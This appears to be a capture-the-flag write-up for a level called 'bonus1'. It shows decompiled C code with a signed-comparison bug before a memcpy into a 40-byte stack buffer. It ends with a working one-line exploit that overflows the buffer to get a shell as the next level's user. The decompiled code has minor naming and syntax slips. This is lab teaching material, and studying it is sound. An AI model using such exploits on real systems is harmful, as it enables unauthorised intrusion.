bonus1
======

Dissassembly
------------

The program looks like this:
```c
int	main(int ac, const char **ap)
{
    int		error;
    char	buffer[40];
    int		i;

    i = atoi(av[1]);
    if (i < 10) {
        memcpy(buffer, av[2], (size_t)(i * 4));

        if (i == (int)"FLOW")
            execl("/bin/sh", ["/bin/sh", NULL], NULL);

        error = 0;
    }
    else
        error = 1;

    return error;
}
```

The main function does a signed comparison on the digital value of the second argument, and copies four times as much characters as specified from the first argument into a stack buffer.
A shell is launched if the stack variable i is set to the ascii encoded string `FLOW`.

Exploitation
------------

The buffer is 40 bytes long and the comparison seems to be meant to prevent an overflow. However, since the comparison is signed but treated as unsigned by memcpy, we can use a negative number to pass the first condition and overwrite the variable i.

```sh
./bonus1 "$(bc <<< '11 - (2 ^ 32) / 4')" "$(printf '%.0sA' {1..40})FLOW" <<< whoami
```
```
bonus2
```
